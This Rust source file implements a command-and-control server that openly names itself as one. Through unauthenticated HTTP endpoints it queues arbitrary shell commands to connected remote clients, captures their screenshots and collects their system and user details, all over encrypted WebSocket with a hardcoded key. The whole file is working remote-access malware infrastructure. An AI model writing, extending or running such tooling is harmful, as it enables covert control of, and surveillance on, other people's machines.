use std::{collections::HashMap, net::SocketAddr, sync::Arc, time::SystemTime};
use tokio::sync::RwLock;
use warp::{Filter, ws::{WebSocket, Ws}, Reply, Rejection};
use uuid::Uuid;
use log::{info, warn, error};
use futures_util::{SinkExt, StreamExt};
use base64;

use c2_common::{Crypto, ClientInfo, Command, Response, generate_key};
use serde::Deserialize;

struct ClientState {
    info: ClientInfo,
    last_heartbeat: SystemTime,
    crypto: Crypto,
    last_system_info: Option<String>,
    last_screenshot: Option<Vec<u8>>,
    last_command_output: Option<String>,
    pending_commands: Vec<Command>,
}

#[derive(Debug, Deserialize)]
struct ShellCommandRequest {
    command: String,
    args: Vec<String>,
}

#[derive(Clone)]
struct AppState {
    clients: Arc<RwLock<HashMap<Uuid, ClientState>>>,
    server_key: Vec<u8>,
}

impl AppState {
    fn new() -> Self {
        // Use a fixed key for testing
        let server_key = vec![85, 172, 38, 160, 226, 46, 39, 58, 94, 204, 187, 246, 168, 243, 98, 109, 202, 53, 12, 35, 54, 242, 176, 93, 61, 98, 44, 107, 246, 206, 139, 229];
        info!(target: "server", "Server key: {:?}", server_key);
        Self {
            clients: Arc::new(RwLock::new(HashMap::new())),
            server_key,
        }
    }
    
    async fn add_client(&self, client_id: Uuid, client_info: ClientInfo, crypto: Crypto) {
        let hostname = client_info.hostname.clone();
        let mut clients = self.clients.write().await;
        clients.insert(client_id, ClientState {
            info: client_info,
            last_heartbeat: SystemTime::now(),
            crypto,
            last_system_info: None,
            last_screenshot: None,
            last_command_output: None,
            pending_commands: Vec::new(),
        });
        info!(target: "server", "Client connected: {} ({})", client_id, hostname);
    }
    
    async fn remove_client(&self, client_id: Uuid) {
        let mut clients = self.clients.write().await;
        if let Some(client) = clients.remove(&client_id) {
            info!(target: "server", "Client disconnected: {} ({})", client_id, client.info.hostname);
        }
    }
    
    async fn update_heartbeat(&self, client_id: Uuid) {
        let mut clients = self.clients.write().await;
        if let Some(client) = clients.get_mut(&client_id) {
            client.last_heartbeat = SystemTime::now();
        }
    }
}

async fn handle_websocket(ws: WebSocket, state: Arc<AppState>) {
    let mut client_id = Uuid::new_v4(); // Temporary ID, will be replaced with client's actual ID
    let crypto = Crypto::new(&state.server_key).unwrap();
    
    let (mut ws_tx, mut ws_rx) = ws.split();
    
    // Wait for client to send its info first
    let mut client_info_received = false;
    
    // Create a ticker for checking pending commands
    let mut command_ticker = tokio::time::interval(std::time::Duration::from_secs(1));
    
    loop {
        tokio::select! {
            result = ws_rx.next() => {
                match result {
                    Some(Ok(msg)) => {
                        if msg.is_binary() {
                            let bytes = msg.into_bytes();
                            match crypto.decrypt(&bytes) {
                                Ok(decrypted) => {
                                    // Try to parse as ClientInfo first (initial registration)
                                    if !client_info_received {
                                        info!(target: "server", "Received initial message, trying to parse as ClientInfo");
                                        if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&decrypted) {
                                            info!(target: "server", "Client info parsed successfully: {:?}", client_info);
                                            // Use the client's actual ID instead of the temporary one
                                            client_id = client_info.id;
                                            state.add_client(client_id, client_info, crypto.clone()).await;
                                            client_info_received = true;
                                            continue;
                                        } else {
                                            info!(target: "server", "Failed to parse as ClientInfo, data: {:?}", decrypted);
                                        }
                                    }
                                    
                                    // Handle heartbeat messages (just ignore them)
                                    if decrypted == b"heartbeat" {
                                        continue;
                                    }
                                    
                                    // Otherwise handle as command response
                                    if let Ok(response) = serde_json::from_slice::<Response>(&decrypted) {
                                        handle_client_response(response, &state, client_id).await;
                                    }
                                    
                                    // Or handle as command
                                    if let Ok(command) = serde_json::from_slice::<Command>(&decrypted) {
                                        handle_command(command, &state, client_id, &crypto, &mut ws_tx).await;
                                    }
                                }
                                Err(e) => {
                                    warn!(target: "server", "Decryption failed: {:?}", e);
                                }
                            }
                        }
                    }
                    Some(Err(e)) => {
                        error!(target: "server", "WebSocket error: {:?}", e);
                        break;
                    }
                    None => {
                        info!(target: "server", "WebSocket connection closed");
                        break;
                    }
                }
            }
            _ = command_ticker.tick() => {
                // Check for pending commands
                if client_info_received {
                    let mut clients = state.clients.write().await;
                    if let Some(client_state) = clients.get_mut(&client_id) {
                        if !client_state.pending_commands.is_empty() {
                            let commands = std::mem::take(&mut client_state.pending_commands);
                            for command in commands {
                                info!(target: "server", "Sending pending command to client {}: {:?}", client_id, command);
                                if let Err(e) = send_command_to_client(&command, &client_state.crypto, &mut ws_tx).await {
                                    error!(target: "server", "Failed to send command to client {}: {:?}", client_id, e);
                                    // Re-add the command to the queue if sending failed
                                    client_state.pending_commands.push(command);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    state.remove_client(client_id).await;
}

async fn send_command_to_client(
    command: &Command,
    crypto: &Crypto,
    ws_tx: &mut futures_util::stream::SplitSink<warp::ws::WebSocket, warp::ws::Message>,
) -> Result<(), Box<dyn std::error::Error>> {
    info!(target: "server", "Sending command to client: {:?}", command);
    
    let command_bytes = serde_json::to_vec(command)?;
    let encrypted = crypto.encrypt(&command_bytes)?;
    
    ws_tx.send(warp::ws::Message::binary(encrypted)).await?;
    info!(target: "server", "Command sent successfully");
    
    Ok(())
}

async fn handle_command(
    command: Command,
    state: &Arc<AppState>,
    client_id: Uuid,
    crypto: &Crypto,
    ws_tx: &mut futures_util::stream::SplitSink<warp::ws::WebSocket, warp::ws::Message>,
) {
    info!(target: "server", "Sending command to client {}: {:?}", client_id, command);
    
    // Send the actual command to the client
    if let Err(e) = send_command_to_client(&command, crypto, ws_tx).await {
        error!(target: "server", "Failed to send command to client {}: {:?}", client_id, e);
    }
}

async fn handle_client_response(response: Response, state: &Arc<AppState>, client_id: Uuid) {
    let mut clients = state.clients.write().await;
    if let Some(client) = clients.get_mut(&client_id) {
        match response {
            Response::SystemInfo { os, hostname, user } => {
                client.last_system_info = Some(format!("OS: {}, Hostname: {}, User: {}", os, hostname, user));
            }
            Response::Success { output, data } => {
                if output.contains("Screenshot") && data.is_some() {
                    client.last_screenshot = data;
                } else {
                    client.last_command_output = Some(output);
                }
            }
            Response::Error { message } => {
                client.last_command_output = Some(format!("Error: {}", message));
            }
            _ => {}
        }
    }
}

async fn handle_http_command(client_id: Uuid, command_type: String, state: Arc<AppState>) -> Result<impl Reply, Rejection> {
    let mut clients = state.clients.write().await;
    
    if let Some(client_state) = clients.get_mut(&client_id) {
        let command = match command_type.as_str() {
            "system_info" => Command::SystemInfo,
            "screenshot" => Command::Screenshot,
            "shell" => Command::Execute { 
                command: "whoami".to_string(), 
                args: vec![] 
            },
            _ => {
                return Ok(warp::reply::json(&serde_json::json!({ 
                    "status": "error", 
                    "message": "Unknown command type" 
                })))
            }
        };
        
        // Add command to the pending queue
        client_state.pending_commands.push(command);
        info!(target: "server", "Command queued for client {}: {:?}", client_id, command_type);
        
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "success", 
            "message": "Command queued for client",
            "client_id": client_id.to_string(),
            "command": command_type
        })))
    } else {
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "error", 
            "message": "Client not found" 
        })))
    }
}

async fn handle_shell_command(client_id: Uuid, shell_command: ShellCommandRequest, state: Arc<AppState>) -> Result<impl Reply, Rejection> {
    let mut clients = state.clients.write().await;
    
    if let Some(client_state) = clients.get_mut(&client_id) {
        let command = Command::Execute {
            command: shell_command.command.clone(),
            args: shell_command.args.clone(),
        };
        
        // Add command to the pending queue
        client_state.pending_commands.push(command);
        info!(target: "server", "Shell command queued for client {}: {:?}", client_id, shell_command);
        
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "success", 
            "message": "Shell command queued for client",
            "client_id": client_id.to_string()
        })))
    } else {
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "error", 
            "message": "Client not found" 
        })))
    }
}

async fn handle_system_info(client_id: Uuid, state: Arc<AppState>) -> Result<impl Reply, Rejection> {
    let clients = state.clients.read().await;
    
    if let Some(client) = clients.get(&client_id) {
        if let Some(system_info) = &client.last_system_info {
            Ok(warp::reply::json(&serde_json::json!({ 
                "status": "success", 
                "system_info": system_info 
            })))
        } else {
            Ok(warp::reply::json(&serde_json::json!({ 
                "status": "error", 
                "message": "No system info available" 
            })))
        }
    } else {
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "error", 
            "message": "Client not found" 
        })))
    }
}

async fn handle_screenshot(client_id: Uuid, state: Arc<AppState>) -> Result<impl Reply, Rejection> {
    let clients = state.clients.read().await;
    
    if let Some(client) = clients.get(&client_id) {
        if let Some(screenshot_data) = &client.last_screenshot {
            // Return the screenshot data as base64
            let base64_data = base64::encode(screenshot_data);
            Ok(warp::reply::json(&serde_json::json!({ 
                "status": "success", 
                "screenshot": base64_data,
                "message": "Screenshot available" 
            })))
        } else {
            Ok(warp::reply::json(&serde_json::json!({ 
                "status": "error", 
                "message": "No screenshot available" 
            })))
        }
    } else {
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "error", 
            "message": "Client not found" 
        })))
    }
}

async fn handle_command_output(client_id: Uuid, state: Arc<AppState>) -> Result<impl Reply, Rejection> {
    let clients = state.clients.read().await;
    
    if let Some(client) = clients.get(&client_id) {
        if let Some(output) = &client.last_command_output {
            Ok(warp::reply::json(&serde_json::json!({ 
                "status": "success", 
                "output": output 
            })))
        } else {
            Ok(warp::reply::json(&serde_json::json!({ 
                "status": "error", 
                "message": "No command output available" 
            })))
        }
    } else {
        Ok(warp::reply::json(&serde_json::json!({ 
            "status": "error", 
            "message": "Client not found" 
        })))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    
    let state = Arc::new(AppState::new());
    
    let ws_state = state.clone();
    let ws_route = warp::path("ws")
        .and(warp::ws())
        .and(warp::any().map(move || ws_state.clone()))
        .map(|ws: Ws, state: Arc<AppState>| {
            ws.on_upgrade(move |socket| handle_websocket(socket, state))
        });
    
    let health_route = warp::path("health")
        .and(warp::get())
        .map(|| warp::reply::json(&serde_json::json!({ "status": "ok" })));
    
    let clients_state = state.clone();
    let clients_route = warp::path("clients")
        .and(warp::get())
        .and(warp::any().map(move || clients_state.clone()))
        .and_then(|state: Arc<AppState>| async move {
            let clients = state.clients.read().await;
            let client_infos: Vec<ClientInfo> = clients.values().map(|c| c.info.clone()).collect();
            Ok::<_, warp::Rejection>(warp::reply::json(&client_infos))
        });

    let command_state = state.clone();
    let command_route = warp::path!("command" / Uuid / String)
        .and(warp::post())
        .and(warp::any().map(move || command_state.clone()))
        .and_then(|client_id: Uuid, command_type: String, state: Arc<AppState>| async move {
            handle_http_command(client_id, command_type, state).await
        });

    let shell_state = state.clone();
    let shell_route = warp::path!("shell" / Uuid)
        .and(warp::post())
        .and(warp::body::json())
        .and(warp::any().map(move || shell_state.clone()))
        .and_then(|client_id: Uuid, shell_command: ShellCommandRequest, state: Arc<AppState>| async move {
            handle_shell_command(client_id, shell_command, state).await
        });

    let response_state = state.clone();
    let system_info_route = warp::path!("systeminfo" / Uuid)
        .and(warp::get())
        .and(warp::any().map(move || response_state.clone()))
        .and_then(|client_id: Uuid, state: Arc<AppState>| async move {
            handle_system_info(client_id, state).await
        });

    let screenshot_state = state.clone();
    let screenshot_route = warp::path!("screenshot" / Uuid)
        .and(warp::get())
        .and(warp::any().map(move || screenshot_state.clone()))
        .and_then(|client_id: Uuid, state: Arc<AppState>| async move {
            handle_screenshot(client_id, state).await
        });

    let output_state = state.clone();
    let output_route = warp::path!("output" / Uuid)
        .and(warp::get())
        .and(warp::any().map(move || output_state.clone()))
        .and_then(|client_id: Uuid, state: Arc<AppState>| async move {
            handle_command_output(client_id, state).await
        });
    
    let routes = ws_route
        .or(health_route)
        .or(clients_route)
        .or(command_route)
        .or(shell_route)
        .or(system_info_route)
        .or(screenshot_route)
        .or(output_route)
        .with(warp::cors()
            .allow_any_origin()
            .allow_methods(vec!["GET", "POST", "OPTIONS"])
            .allow_headers(vec!["Content-Type"]));
    
    let addr: SocketAddr = "127.0.0.1:8080".parse()?;
    
    info!(target: "server", "Starting C2 server on {}", addr);
    
    warp::serve(routes).run(addr).await;
    
    Ok(())
}